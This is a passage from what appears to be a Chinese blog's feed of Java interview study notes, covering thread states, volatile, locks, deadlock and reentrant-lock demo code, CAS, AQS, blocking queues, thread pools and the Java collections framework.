javax.print.DocFlavor;import java.util.concurrent.ExecutorService;import java.util.concurrent.Executors;public class ThreadByPool &#123; public static void main(String[] args)&#123; ExecutorService service = Executors.newFixedThreadPool(5); for (int i=0;i&lt;10;i++)&#123; service.execute(new ThreadByThread()); &#125; System.out.println(Thread.currentThread()); service.shutdown(); &#125;&#125; 线程基本原理线程有哪些状态 创建 -&gt; 就绪 -&gt; 执行 -&gt; 消亡阻塞: 分为同步组织，等待阻塞。 等待阻塞就是wait啦，sleep啦。同步阻塞就是sychronize锁被占用，另一个线程也需要占用这个锁，结果凉了，就阻塞了。 线程的基本一些方法 sleep 就是进入了等待阻塞队列中，根据设定的时间阻塞，而且不会释放锁，他的阻塞状态就是time_waiting yield 就是让线程立马停止一下，但是不会进入阻塞，而是直接进入就绪,且不会释放锁 join 有点救护车让道的意思，谁调用join谁先执行，然后再执行被停用的线程 wait 就是进入等待状态，而且必须有人去唤醒他，没人唤醒，就被打入阻塞冷宫这辈子也就这样了，但是wait会释放锁，也可以wait（time）来通过时间唤醒 notify 唤醒wait打入冷宫的老铁，但是唤醒谁不能指定，唤醒全靠缘分 notifyall 大发慈悲，冷宫的全放出来了 线程不安全的同步容器比如？ HashMap、ArrayList、LinkedList volatile说说volatile的与sychronize的区别 volatile 不是原子性的，sychronize是原子性的 volatile和sychronize都保证了可见性 volatile是禁止了指令重排的 不能写入 不能修饰写⼊操作依赖当前值的变量，⽐如num++、num=num+1 为啥会出现脏读的问题？ 这个是JMM（java内存模型） 导致的，java线程中不是所有的变量都是在主存的，而是每个线程都有自己的一丢丢空间，对于修改的变量的操作，先从主存拿到，再修改，再写回去，如果多线程，可能因为速度问题，写入的时间啥的有差别，所以就会导致把数据脏读了。 为啥volatile可以解决这个问题呢？ volatile就像是一个敏感的报警灯一样，一旦有人妄图修改volatile修饰的数据，立马报警通知修改情况，所以说原子性差了点，但是可见性或者说是共享性好的鸭匹 指令重排/happens-before啥是指令重排？ 为了提高程序的执行效率，再不改变运行结果的前提下，jvm对字节码文件的指令重新排序，以提高效率 知道 happens-before吗，能否简单解释下？ 由于多线程的特殊性，对jvm的指令重排有严格的限制，所以有了happens-before的原则（先行发生原则） ==&gt;（这个解释靠谱：前一个操作的结果可以被后续的操作获取。讲白点就是前面一个操作把变量a赋值为1，那后面一个操作肯定能知道a已经变成了1。） 划重点：这些规则一并奉上 程序次序规则：在一个线程内一段代码的执行结果是有序的。就是还会指令重排，但是随便它怎么排，结果是按照我们代码的顺序生成的不会变！ 管程锁定规则：就是无论是在单线程环境还是多线程环境，对于同一个锁来说，一个线程对这个锁解锁之后，另一个线程获取了这个锁都能看到前一个线程的操作结果！(管程是一种通用的同步原语，synchronized就是管程的实现） volatile变量规则：就是如果一个线程先去写一个volatile变量，然后一个线程去读这个变量，那么这个写操作的结果一定对读的这个线程可见。 线程启动规则：在主线程A执行过程中，启动子线程B，那么线程A在启动子线程B之前对共享变量的修改结果对线程B可见。 线程终止规则：在主线程A执行过程中，子线程B终止，那么线程B在终止之前对共享变量的修改结果在线程A中可见。 线程中断规则：对线程interrupt()方法的调用先行发生于被中断线程代码检测到中断事件的发生，可以通过Thread.interrupted()检测到是否发生中断。 传递规则：这个简单的，就是happens-before原则具有传递性，即A happens-before B ， B happens-before C，那么A happens-before C。 对象终结规则：这个也简单的，就是一个对象的初始化的完成，也就是构造函数执行的结束一定 happens-before它的finalize()方法。 并发编程进阶并发编程三要素：1. 原子性 要么全成功，要么全失败例如num++ 这种操作就是非原子性的 可以用lock或者Sychronized来修饰这个操作 123public synchronized void add2()&#123; num++;&#125; 123456789Lock lock = new ReentrantLock();public void add1()&#123; lock.lock(); try &#123; num++; &#125;finally &#123; lock.unlock(); &#125;&#125; 2. 可见性3. 有序性进程的执行顺序先来先服务调度算法： 按照作业/进程到达的先后顺序进⾏调度 ，即：优先考虑在系统中等待时间最⻓的作业排在⻓进程后的短进程的等待时间⻓，不利于短作业/进程 短作业优先调度算法： 短进程/作业（要求服务时间最短）在实际情况中占有很⼤⽐例，为了使得它们优先执⾏对⻓作业不友好 ⾼响应⽐优先调度算法: 在每次调度时，先计算各个作业的优先权：优先权=响应⽐=（等待时间+要求服务时间）/要求服务时间,因为等待时间与服务时间之和就是系统对该作业的响应时间，所以 优先权=响应⽐=响应时间/要求服务时间，选 择优先权⾼的进⾏服务需要计算优先权信息，增加了系统的开销 时间⽚轮转调度算法: 轮流的为各个进程服务，让每个进程在⼀定时间间隔内都可以得到响应由于⾼频率的进程切换，会增加了开销，且不区分任务的紧急程度 优先级调度算法: 根据任务的紧急程度进⾏调度，⾼优先级的先处理，低优先级的慢处理如果⾼优先级任务很多且持续产⽣，那低优先级的就可能很慢才被处理 线程的调度算法协同式线程调度(分时调度模式)： 线程执⾏时间由线程本身来控制，线程把⾃⼰的⼯作执⾏完之后，要主动通知系统切换到另外⼀个线程上。最⼤好处是实现简单，且切换操作对线程⾃⼰是可知的，没啥线程同步问题。坏处是线程执⾏时间不可控制，如果⼀个线程有问题，可能⼀直阻塞在那⾥ (佛系顺序执行，自己完事叫下一个继续) 抢占式线程调度： 每个线程将由系统来分配执⾏时间，线程的切换不由线程本身来决定（Java中，Thread.yield()可以让出执⾏时间，但⽆法获取执⾏时间）。线程执⾏时间系统可控，也不会有⼀个线程导致整个进程阻塞 锁悲观锁 每次读写数据都是悲观的，认为可能会出现数据被其它线程读的问题，所以要上锁比如sychronized 乐观锁 每次读取数据都觉得是乐观的，觉得不会有其它线程更改要读取的数据 公平锁 就是大家人人平等，都可以拿到锁，阻塞队列中按照顺序慢慢来=》reetrantlock（fair） 非公平锁 不公平的，只要你条件符合，就可以直接拿到锁=》reetrantlock（unfair）reetrantlock其实底层就是一个队列，所以也是先来先服务那种，在公平锁体现的很好 重入锁 一个线程里吧，还调用另一个线程，然后这个锁对里面的这个线程也生效 不可重入锁 一个线程里吧，还调用另一个线程，然后吧，里面这个线程就不能用这个锁了，就只能乖巧的滚去阻塞队列了 自旋锁 就是想不开的锁，只要没条件获取到锁，就一直自旋，也就是一直去判断条件看看自己能不能获得锁子，while（flag）的感觉，除非获得锁才能结束，但是注意，自旋锁消耗cpu，毕竟在那转来转去的。不会发⽣线程状态的切换，⼀直处于⽤户态，减少了线程上下⽂切换的消耗，缺点是循环会消耗CPU 共享锁 也就是读锁，或者是S锁，就是可以让大家读取，查看，就是不能修改 排他锁 也就是霸占一把锁，只要这个线程占着，别人就不能去获取这个锁，但是只要霸占这个锁，能读能写 死锁 资源抢占矛盾循环了，无外力介入，是解不开的 关于jvm自己内部的几个锁偏向锁 就是如果哪个线程一直用着这个锁，就一直让他先用，更少的消耗量 轻量级锁 如果其他锁妄图获得人家那个偏向锁，那就自旋吧，等人家用完才给你 重量级锁 自选锁也不自旋了，直接阻塞进化成重量级锁，重量级锁会让其他申请的线程进⼊阻塞，性能也会降低 死锁死锁代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package com.runindark.deadlock;public class DeadLock &#123; private static final String locka = "A" ; private static final String lockb = "B" ; public static void LockA()&#123; synchronized (locka)&#123; System.out.println("entre the locka"); try &#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; synchronized (lockb)&#123; System.out.println("a 取 b"); &#125; &#125; &#125; public static void LockB()&#123; synchronized (lockb)&#123; System.out.println("entre the lockb"); synchronized (locka)&#123; System.out.println("b 取 a"); &#125; &#125; &#125; public static void main(String[] args)&#123; for(int i=0;i&lt;10;i++)&#123; System.out.println(i+1 + "次"); new Thread(()-&gt;&#123; DeadLock.LockA(); &#125;).start(); new Thread(()-&gt;&#123; DeadLock.LockB(); &#125;).start(); &#125; &#125;&#125; 解锁代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package com.runindark.deadlock;public class DeadLock &#123; private static final String locka = "A" ; private static final String lockb = "B" ; public static void LockA()&#123; synchronized (locka)&#123; System.out.println("entre the locka"); try &#123; Thread.sleep(2000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; synchronized (lockb)&#123; System.out.println("a 取 b"); &#125; &#125; &#125; public static void LockB()&#123; synchronized (lockb)&#123; System.out.println("entre the lockb"); &#125; synchronized (locka)&#123; System.out.println("b 取 a"); &#125; &#125; public static void main(String[] args)&#123; for(int i=0;i&lt;10;i++)&#123; System.out.println(i+1 + "次"); new Thread(()-&gt;&#123; DeadLock.LockA(); &#125;).start(); new Thread(()-&gt;&#123; DeadLock.LockB(); &#125;).start(); &#125; &#125;&#125; 改变运行策略，其实是线程A中syc获取了锁a，还要获取suob，这样子顺序执行下来是ok 的，就怕线程a获取了锁a后，线程b抢占获取了锁b，此使线程a还要锁b就阻塞了，所以到了线程b又要获取锁a，那么就死锁了解决方法也简单，就是让一个锁提早消失就好了，所以改变一下sychronize的次序，提早释放锁，就万事大吉了 死锁的四个条件 互斥条件：资源不能共享，只能由⼀个线程使⽤请求与保持条件：线程已经获得⼀些资源，但因请求其他资源发⽣阻塞，对已经获得的资源保持不释放不可抢占：有些资源是不可强占的，当某个线程获得这个资源后，系统不能强⾏回收，只能由线程使⽤完⾃⼰释放循环等待条件：多个线程形成环形链，每个都占⽤对⽅申请的下个资源 重入锁和不可重入锁不可重入锁123456789101112131415161718192021222324252627282930package com.runindark.crlock;public class BcrLock &#123; public boolean flag = false ; public synchronized void lock() throws InterruptedException &#123; if (!flag)&#123; System.out.println("进入加锁"); flag = true ; &#125;else &#123; while (flag)&#123; System.out.println(Thread.currentThread().getName() + "进入等待状态"); wait(); &#125; &#125; &#125; public synchronized void unlock()&#123; System.out.println("进入解锁"); notify(); flag = false ; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738package com.runindark.crlock;import org.omg.Messaging.SYNC_WITH_TRANSPORT;public class TestMain &#123; private BcrLock bcrLock = new BcrLock() ; public void methodA()&#123; try &#123; bcrLock.lock(); System.out.println("方法A加锁" + bcrLock.flag); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;finally &#123; bcrLock.unlock(); &#125; &#125; public void methodB()&#123; try &#123; bcrLock.lock(); System.out.println("方法B加锁" + bcrLock.flag); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;finally &#123; bcrLock.unlock(); &#125; &#125; public static void main(String[] args)&#123; new TestMain().methodA(); &#125;&#125; 重入锁1234567891011121314151617181920212223242526272829303132package com.runindark.crlock;import jdk.nashorn.internal.ir.Block;public class CrLock &#123; public boolean islock = false ; public String currentThread = null ; public synchronized void lock() throws InterruptedException &#123; if (currentThread==null) &#123; currentThread = Thread.currentThread().getName(); &#125;else &#123; if (currentThread.equals(Thread.currentThread().getName()))&#123; System.out.println(Thread.currentThread().getName() + "成功加锁"); &#125;else &#123; while (!currentThread.equals(Thread.currentThread().getName()))&#123; System.out.println(Thread.currentThread().getName() + "加锁失败"); wait(); &#125; &#125; &#125; &#125; public synchronized void unlock()&#123; notify(); currentThread = null ; System.out.println(Thread.currentThread().getName() + "成功解锁"); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package com.runindark.crlock;import sun.awt.windows.ThemeReader;public class TestMainB &#123; private CrLock crLock = new CrLock(); public void methodA()&#123; try &#123; crLock.lock(); System.out.println("方法A加锁" + crLock.currentThread); methodB(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;finally &#123; System.out.println("方法a解锁" ); crLock.unlock(); &#125; &#125; public void methodB()&#123; try &#123; crLock.lock(); System.out.println("方法B加锁"+ crLock.currentThread ); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;finally &#123; System.out.println("方法b解锁" ); crLock.unlock(); &#125; &#125; public static void main(String[] args)&#123; new Thread(()-&gt;&#123; new TestMainB().methodA(); &#125;).start(); new Thread(()-&gt;&#123; new TestMainB().methodA(); &#125;); &#125;&#125; synchronized说说看 非公平锁，原子性，可重入可以修饰代码块和方法每个对象有⼀个锁和⼀个等待队列，锁只能被⼀个线程持有，其他需要锁的线程需要阻塞等待。锁被释放后，对象会从队列中取出⼀个并唤醒，唤醒哪个线程是不确定的，不保证公平性jdk6优化-&gt; 偏向锁-&gt;轻量级锁-&gt;重量级锁 CAS什么是CAS？ CAS是一种乐观锁，CompareAndSwap，也就是比较再交换执行过程大概如下： 首先是 内存地址V，预期原值A，新值B ， 如果线程A过来，V = A ,则满足条件把目标值更换成B，如果线程B过来，V ！= A，那么无法将目标值更换成B，而且线程B将进行自旋，直到 A=V ，结束自旋，获取锁缺点也将显而易见： 自旋锁的存在直接导致了cpu的消耗问题 ABA 问题由于CAS不保证原子性问题 简单来说就是线程在操作过程中，有其它线程将该变量更改后，又有另一个线程把他改回来，到最开始线程操作的时候，发现该值没有变化，则该线程操作成功。加一个版本号可以解决问题，每次修改时都要查看版本号 AQS什么是AQS 就是 java.util.concurrent (juc) 的一个工具包 全称是 AbstractQueuedSynchronizer （抽象同步队列）其中核心就是 一个int变量（用于表示同步状态），一个state（计数器），一个线程标记（谁加锁），一个阻塞队列（用于存储未拿到锁阻塞中的线程） 部分核心方法acquire(int arg) 源码讲解，好⽐加锁lock操作 tryAcquire()尝试直接去获取资源，如果成功则直接返回,AQS⾥⾯未实现但没有定义成abstract，因为独占模式下只⽤实现tryAcquire-tryRelease，⽽共享模式下只⽤实现tryAcquireShared-tryReleaseShared，类似设计模式⾥⾯的适配器模式 addWaiter() 根据不同模式将线程加⼊等待队列的尾部，有Node.EXCLUSIVE互斥模式、Node.SHARED共享模式；如果队列不为空，则以通过compareAndSetTail⽅法以CAS将当前线程节点加⼊到等待队列的末尾。否则通过enq(node)⽅法初始化⼀个等待队列 acquireQueued()使线程在等待队列中获取资源，⼀直获取到资源后才返回,如果在等待过程中被中断，则返回true，否则返回falserelease(int arg)源码讲解 好⽐解锁unlock独占模式下线程释放指定量的资源，⾥⾯是根据tryRelease()的返回值来判断该线程是否已经完成释放掉资源了；在⾃义定同步器在实现时，如果已经彻底释放资源(state=0)，要返回true，否则返回falseunparkSuccessor⽅法⽤于唤醒等待队列中下⼀个线程 ReentrantLock实现原理 实现大致的思路是和AQS是一致的，ReentrantLock的实现是分为公平锁和非公平锁的，其中上层Lock（Accquire），Unlock（Release）上层一致，唯独在释放的时候有一点区别，公平锁的实现是直接去队列中去找，看看队列中是否有等待，如果有等待的话则排队，无等待的话就直接给锁，对应的方法也就是TryAccquire（） ，而非公平锁则直接判断是不是符合获取锁的条件CompareAndState，如果符合直接给锁，如果不符合，则是按照公平锁的方法处理 ReentrantLock和synchronized区别是什么？ ReentrantLock和synchronized都是独占锁 synchronized： · 是悲观锁会引起其他线程阻塞，java内置关键字，· ⽆法判断是否获取锁的状态，锁可重⼊、不可中断、只能是⾮公平· 加锁解锁的过程是隐式的,⽤户不⽤⼿动操作,优点是操作简单但显得不够灵活· ⼀般并发场景使⽤⾜够、可以放在被递归执⾏的⽅法上,且不⽤担⼼线程最后能否正确释放锁· synchronized操作的应该是对象头中mark word，参考原先原理图⽚ ReentrantLock： · 是个Lock接⼝的实现类，是悲观锁，· 可以判断是否获取到锁，可重⼊、可判断、可公平可不公平· 需要⼿动加锁和解锁,且解锁的操作尽量要放在finally代码块中,保证线程正确释放锁· 在复杂的并发场景中使⽤在重⼊时要却确保重复获取锁的次数必须和重复释放锁的次数⼀样，否则可能导致 其他线程⽆法获得该锁。· 创建的时候通过传进参数true创建公平锁,如果传⼊的是false或没传参数则创建的是⾮公平锁· 底层不同是AQS的state和FIFO队列来控制加锁 ReentrantReadWriteLock 读写锁 读写锁其实就是一个分离的ReentrantLock,由于ReentrantLock无论读或者写都是加锁的，但是读其实是安全的，盲目加锁只能过多的消耗资源，所以应该只有写是独占锁，写则是排他锁，这样子才可以优化资源，流程一般是获取写锁，获取读锁，释放写锁，释放读锁。虽然也是重入锁，但是写可以重入读或者写，但是读就只能重入读 阻塞队列BlockingQueue j.u.c包下的提供了线程安全的队列访问的接⼝，并发包下很多⾼级同步类的实现都是基于阻塞队列实现的1、当阻塞队列进⾏插⼊数据时，如果队列已满，线程将会阻塞等待直到队列⾮满2、从阻塞队列读数据时，如果队列为空，线程将会阻塞等待直到队列⾥⾯是⾮空的时候 ArrayBlockingQueue： 基于数组实现的⼀个阻塞队列，需要指定容量⼤⼩，FIFO先进先出顺序 LinkedBlockingQueue： 基于链表实现的⼀个阻塞队列，如果不指定容量⼤⼩，默认Integer.MAX_VALUE, FIFO先进先出顺序 PriorityBlockingQueue： ⼀个⽀持优先级的⽆界阻塞队列，默认情况下元素采⽤⾃然顺序升序排序，也可以⾃定义排序实现 java.lang.Comparable接⼝ DelayQueue： 延迟队列，在指定时间才能获取队列元素的功能，队列头元素是最接近过期的元素，⾥⾯的对象必须实现 java.util.concurrent.Delayed 接⼝并实现CompareTo和getDelay⽅法 ConcurrentLinkedQueue 并发队列ConcurrentLinkedQueue是基于链表实现的⽆界线程安全队列，采⽤FIFO进⾏排序保证线程安全的三要素：原⼦、有序、可⻅性1、底层结构是Node，链表头部和尾部节点是head和tail，使⽤节点变量和内部类属性使⽤volatile声明保证了有序和可⻅性2、插⼊、移除、更新操作使⽤CAS⽆锁操作，保证了原⼦性 线程池 提⾼系统资源的使⽤率，同时避免过多资源竞争，避免堵塞，且可以定时定期执⾏、单线程、并发数控制，配置任务过多任务后的拒绝策略等功能 线程池分类newFixedThreadPool ⼀个定⻓线程池，可控制线程最⼤并发数 newCachedThreadPool ⼀个可缓存线程池 newSingleThreadExecutor ⼀个单线程化的线程池，⽤唯⼀的⼯作线程来执⾏任务 newScheduledThreadPool ⼀个定⻓线程池，⽀持定时/周期性任务执⾏ 线程池踩坑推荐ThreadPoolExecutor的⽅式原因 newFixedThreadPool和newSingleThreadExecutor: 队列使⽤LinkedBlockingQueue，队列⻓度为 Integer.MAX_VALUE，可能造成堆积，导致OOM newScheduledThreadPool和newCachedThreadPool: 线程池⾥⾯允许最⼤的线程数是Integer.MAX_VALUE，可能会创建过多线程，导致OOM 核心参数corePoolSize： 核⼼线程数，线程池也会维护线程的最少数量，默认情况下核⼼线程会⼀直存活，即使没有任务也不会受存keepAliveTime控制坑：在刚创建线程池时线程不会⽴即启动，到有任务提交时才开始创建线程并逐步线程数⽬达到corePoolSize maximumPoolSize： 线程池维护线程的最⼤数量，超过将被阻塞坑：当核⼼线程满，且阻塞队列也满时，才会判断当前线程数是否⼩于最⼤线程数，才决定是否创建新线程 keepAliveTime： ⾮核⼼线程的闲置超时时间，超过这个时间就会被回收，直到线程数量等于corePoolSize unit： 指定keepAliveTime的单位，如TimeUnit.SECONDS、TimeUnit.MILLISECONDS workQueue: 线程池中的任务队列,常⽤的是 ArrayBlockingQueue、LinkedBlockingQueue、SynchronousQueue threadFactory： 创建新线程时使⽤的⼯⼚ handler: RejectedExecutionHandler是⼀个接⼝且只有⼀个⽅法,线程池中的数量⼤于maximumPoolSize，对拒绝任务的处理策略，默认有4种策略AbortPolicy、CallerRunsPolicy、DiscardOldestPolicy、DiscardPolicy ThreadLocal博文地址]]></content>
  </entry>
  <entry>
    <title><![CDATA[《天净沙·我·Java集合》 双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？]]></title>
    <url>%2F2020%2F03%2F05%2F2020%E6%98%A5%E6%8B%9B%2F%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-Java%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[别问 问就是为了面试豁出了老命[文章都是搬运艿艿的][http://svip.iocoder.cn/Java/Core/Interview/] Java集合概述图概述图 说出一些集合框架的优点？ 使用核心集合类降低开发成本，而非实现我们自己的集合类。 随着使用经过严格测试的集合框架类，代码质量会得到提高。 通过使用 JDK 附带的集合类，可以降低代码维护成本。 复用性和可操作性。集合框架中的泛型有什么优点？ Java5 引入了泛型，所有的集合接口和实现都大量地使用它。泛型允许我们为集合提供一个可以容纳的对象类型。因此，如果你添加其它类型的任何元素，它会在编译时报错。这避免了在运行时出现 ClassCastException，因为你将会在编译时得到报错信息。 泛型也使得代码整洁，我们不需要使用显式转换和 instanceOf 操作符。它也给运行时带来好处，因为不会产生类型检查的字节码指令 Java 集合框架的基础接口有哪些？Collection 为集合层级的根接口。一个集合代表一组对象，这些对象即为它的元素。Java 平台不提供这个接口任何直接的实现。 Set是一个不能包含重复元素的集合。这个接口对数学集合抽象进行建模，被用来代表集合，就如一副牌。 List 是一个有序集合，可以包含重复元素。你可以通过它的索引来访问任何元素。List 更像长度动态变换的数组。 Map 是一个将 key 映射到 value 的对象。一个 Map 不能包含重复的 key，每个 key 最多只能映射一个 value 。 其它一些其它的接口有 Queue、Dequeue、SortedSet、SortedMap 和 ListIterator 。 为何 Collection 不从 Cloneable 和 Serializable 接口继承？ Collection 接口指定一组对象，对象即为它的元素如何维护这些元素由 Collection 的具体实现决定。例如，一些如 List 的 Collection 实现允许重复的元素，而其它的如 Set 就不允许。很多 Collection 实现有一个公有的 clone 方法。然而，把它放到集合的所有实现中也是没有意义的。这是因为 Collection 是一个抽象表现，重要的是实现。 为何 Map 接口不继承 Collection 接口？ 尽管 Map 接口和它的实现也是集合框架的一部分，但 Map 不是集合，集合也不是 Map。因此，Map 继承 Collection 毫无意义，反之亦然。如果 Map 继承 Collection 接口，那么元素去哪儿？Map 包含 key-value 对，它提供抽取 key 或 value 列表集合( Collection )的方法，但是它不适合“一组对象”规范。 Collection 和 Collections 的区别？ Collection ，是集合类的上级接口，继承与他的接口主要有 Set 和List 。Collections ，是针对集合类的一个工具类，它提供一系列静态方法实现对各种集合的搜索、排序、线程安全化等操作。 集合框架里实现的通用算法有哪些？ Java 集合框架提供常用的算法实现，比如排序和搜索。Collections类包含这些方法实现。大部分算法是操作 List 的，但一部分对所有类型的集合都是可用的。部分算法有排序、搜索、混编、最大最小值。 集合框架底层数据结构总结List ArrayList ：Object 数组。 Vector ：Object 数组。 LinkedList ：双向链表(JDK6 之前为循环链表，JDK7 取消了循环)。 Map HashMap ：JDK8 之前，HashMap 由数组+链表组成的，数组是HashMap的主体，链表则是主要为了解决哈希冲突而存在的（“拉链法”解决冲突）。JDK8 以后，在解决哈希冲突时有了较大的变化，当链表长度大于阈值（默认为 8 ）时，将链表转化为红黑树，以减少搜索时间。 LinkedHashMap ：LinkedHashMap 继承自 HashMap，所以它的底层仍然是基于拉链式散列结构即由数组和链表或红黑树组成。另外，LinkedHashMap 在上面结构的基础上，增加了一条双向链表，使得上面的结构可以保持键值对的插入顺序。同时通过对链表进行相应的操作，实现了访问顺序相关逻辑。详细可以查看：《LinkedHashMap 源码详细分析（JDK1.8）》 。 Hashtable ：数组+链表组成的，数组是 HashMap 的主体，链表则是主要为了解决哈希冲突而存在的。 TreeMap ：红黑树（自平衡的排序二叉树）。 SetHashSet ：无序，唯一，基于 HashMap 实现的，底层采用 HashMap 来保存元素。LinkedHashSet ：LinkedHashSet 继承自 HashSet，并且其内部是通过 LinkedHashMap 来实现的。有点类似于我们之前说的LinkedHashMap 其内部是基于 HashMap 实现一样，不过还是有一点点区别的。TreeSet ：有序，唯一，红黑树(自平衡的排序二叉树)。 什么是迭代器(Iterator)？ Iterator 接口，提供了很多对集合元素进行迭代的方法。每一个集合类都包含了可以返回迭代器实例的迭代方法。迭代器可以在迭代的过程中删除底层集合的元素，但是不可以直接调用集合的 #remove(Object Obj) 方法删除，可以通过迭代器的 #remove() 方法删除。 Iterator 和 ListIterator 的区别是什么？ Iterator 可用来遍历 Set 和 List 集合，但是 ListIterator 只能用来遍历 List。Iterator 对集合只能是前向遍历，ListIterator 既可以前向也可以后向。ListIterator 实现了 Iterator 接口，并包含其他的功能。比如：增加元素，替换元素，获取前一个和后一个元素的索引等等。 快速失败（fail-fast）和安全失败（fail-safe）的区别是什么？ 差别在于 ConcurrentModification 异常：快速失败：当你在迭代一个集合的时候，如果有另一个线程正在修改你正在访问的那个集合时，就会抛出一个 ConcurrentModification 异常。 在 java.util 包下的都是快速失败。安全失败：你在迭代的时候会去底层集合做一个拷贝，所以你在修改上层集合的时候是不会受影响的，不会抛出 ConcurrentModification 异常。在 java.util.concurrent 包下的全是安全失败的。 如何删除 List 中的某个元素？ 方式一，使用 Iterator ，顺序向下，如果找到元素，则使用 remove 方法进行移除。方式二，倒序遍历 List ，如果找到元素，则使用 remove 方法进行移除。 Enumeration 和 Iterator 接口有什么不同？ Enumeration 跟 Iterator 相比较快两倍，而且占用更少的内存。但是，Iterator 相对于 Enumeration 更安全，因为其他线程不能修改当前迭代器遍历的集合对象。同时，Iterators 允许调用者从底层集合中移除元素，这些 Enumerations 都没法完成。 123456789101112131415161718192021import java.util.Vector;import java.util.Enumeration; public class EnumerationTester &#123; public static void main(String args[]) &#123; Enumeration&lt;String&gt; days; Vector&lt;String&gt; dayNames = new Vector&lt;String&gt;(); dayNames.add("Sunday"); dayNames.add("Monday"); dayNames.add("Tuesday"); dayNames.add("Wednesday"); dayNames.add("Thursday"); dayNames.add("Friday"); dayNames.add("Saturday"); days = dayNames.elements(); while (days.hasMoreElements())&#123; System.out.println(days.nextElement()); &#125; &#125;&#125; 为何 Iterator 接口没有具体的实现？ Iterator 接口，定义了遍历集合的方法，但它的实现则是集合实现类的责任。每个能够返回用于遍历的 Iterator 的集合类都有它自己的 Iterator 实现内部类。这就允许集合类去选择迭代器是 fail-fast 还是 fail-safe 的。比如，ArrayList 迭代器是 fail-fast 的，而 CopyOnWriteArrayList 迭代器是 fail-safe 的。 Comparable 和 Comparator 的区别? Comparable 接口，在 java.lang 包下，用于当前对象和其它对象的比较，所以它有一个 #compareTo(Object obj) 方法用来排序，该方法只有一个参数。Comparator 接口，在 java.util 包下，用于传入的两个对象的比较，所以它有一个 #compare(Object obj1, Object obj2) 方法用来排序，该方法有两个参数。 compareTo 方法的返回值表示的意思？ · 大于 0 ，表示对象大于参数对象。· 小于 0 ，表示对象小于参数对象· 等于 0 ，表示两者相等。 如何对 Object 的 List 排序？ 对 Object[] 数组进行排序时，我们可以用 Arrays#sort(…) 方法。对 List 数组进行排序时，我们可以用 Collections#sort(…) 方法。 List VS SetList 和 Set 区别？ List，Set 都是继承自 Collection 接口。· List 特点：元素有放入顺序，元素可重复。· Set 特点：元素无放入顺序，元素不可重复，重复元素会覆盖掉。 注意：元素虽然无放入顺序，但是元素在 Set 中的位置是有该元素的 hashcode 决定的，其位置其实是固定的。另外 List 支持 for 循环，也就是通过下标来遍历，也可以用迭代器，但是 Set 只能用迭代，因为他无序，无法用下标来取得想要的值。 Set 和 List 对比： Set：检索指定的元素效率高，删除和插入效率高，插入和删除可能会引起元素位置改变。List：和数组类似，List 可以动态增长，查找指定的元素效率低，插入删除指定的元素效率低，因为可能会引起其他元素位置改变。 Array系 VS List系Array 和 ArrayList 有何区别？什么时候更适合用 Array？ Array 可以容纳基本类型和对象，而 ArrayList 只能容纳对象。Array 是指定大小的，而 ArrayList 大小是固定的，可自动扩容。Array 没有提供 ArrayList 那么多功能，比如 addAll、removeAll 和 iterator 等。尽管 ArrayList 明显是更好的选择，但也有些时候 Array 比较好用，比如下面的三种情况。 1、如果列表的大小已经指定，大部分情况下是存储和遍历它们2、对于遍历基本数据类型，尽管 Collections 使用自动装箱来减轻编码任务，在指定大小的基本类型的列表上工作也会变得很慢。3、如果你要使用多维数组，使用 [][] 比 List 会方便。 ArrayList 与 LinkedList 区别？ArrayList 优点：ArrayList 是实现了基于动态数组的数据结构，因为地址连续，一旦数据存储好了，查询操作效率会比较高（在内存里是连着放的）。缺点：因为地址连续，ArrayList 要移动数据，所以插入和删除操作效率比较低。 LinkedList 优点：LinkedList 基于链表的数据结构，地址是任意的，所以在开辟内存空间的时候不需要等一个连续的地址。对于新增和删除操作 add 和 remove ，LinedList 比较占优势。LinkedList 适用于要头尾操作或插入指定位置的场景。缺点：因为 LinkedList 要移动指针，所以查询操作性能比较低。 适用场景分析： 当需要对数据进行对随机访问的情况下，选用 ArrayList 。当需要对数据进行多次增加删除修改时，采用 LinkedList 。 ArrayList 是如何扩容的？ 如果通过无参构造的话，初始数组容量为 0 ，当真正对数组进行添加时，才真正分配容量。每次按照 1.5 倍（位运算）的比率通过 copeOf 的方式扩容。在 JKD6 中实现是，如果通过无参构造的话，初始数组容量为10，每次通过 copeOf 的方式扩容后容量为原来的 1.5 倍。 ArrayList 与 Vector 区别？rrayList 和 Vector 都是用数组实现的，主要有这么三个区别： Vector 是多线程安全的，线程安全就是说多线程访问同一代码，不会产生不确定的结果，而 ArrayList 不是。这个可以从源码中看出，Vector 类中的方法很多有 synchronized 进行修饰，这样就导致了 Vector 在效率上无法与 ArrayList 相比。 两个都是采用的线性连续空间存储元素，但是当空间不足的时候，两个类的增加方式是不同。 Vector 可以设置增长因子，而 ArrayList 不可以 Vector 是线程同步的，所以它也是线程安全的，而 ArrayList 是线程无需同步的，是不安全的。如果不考虑到线程的安全因素，一般用 ArrayList 效率比较高。实际场景下，如果需要多线程访问安全的数组，使用 CopyOnWriteArrayList 。如果集合中的元素的数目大于目前集合数组的长度时，在集合中使用数据量比较大的数据，用 Vector 有一定的优势。 HashMap 和 Hashtable 的区别？ Hashtable 是在 Java 1.0 的时候创建的，而集合的统一规范命名是在后来的 Java2.0 开始约定的，而当时其他一部分集合类的发布构成了新的集合框架。Hashtable 继承 Dictionary ，HashMap 继承的是 Java2 出现的 Map 接口。 HashMap 去掉了 Hashtable 的 contains 方法，但是加上了 containsValue 和 containsKey 方法。 HashMap 允许空键值，而 Hashtable 不允许。【重点】4. HashTable 是同步的，而 HashMap 是非同步的，效率上比 HashTable 要高。也因此，HashMap 更适合于单线程环境，而 HashTable 适合于多线程环境。 HashMap 的迭代器（Iterator）是 fail-fast 迭代器，HashTable的 enumerator 迭代器不是 fail-fast 的。 HashTable 中数组默认大小是 11 ，扩容方法是 old * 2 + 1 